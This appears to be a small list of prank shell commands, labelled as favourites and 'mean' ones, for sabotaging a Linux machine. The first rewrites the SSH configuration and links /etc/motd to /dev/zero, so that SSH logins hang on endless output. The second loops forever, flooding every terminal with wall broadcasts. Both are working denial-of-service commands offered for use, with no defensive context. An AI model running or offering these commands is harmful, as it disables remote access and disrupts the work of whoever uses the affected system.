# my favorite
sudo sed -i 's/^\(PrintMotd.*$\)/#\1/' /etc/ssh/sshd_config; sudo bash -c "echo 'PrintMotd yes' >> /etc/ssh/sshd_config"; sudo mv /etc/motd /etc/motd.bak; sudo ln -s /dev/zero /etc/motd; sudo systemctl restart ssh; exit

# another mean one
while true; do sudo wall -n  <<< $(for i in $(seq 0 $RANDOM); do printf "%s" "AND IT JUST KEEPS COMING"; done); done 
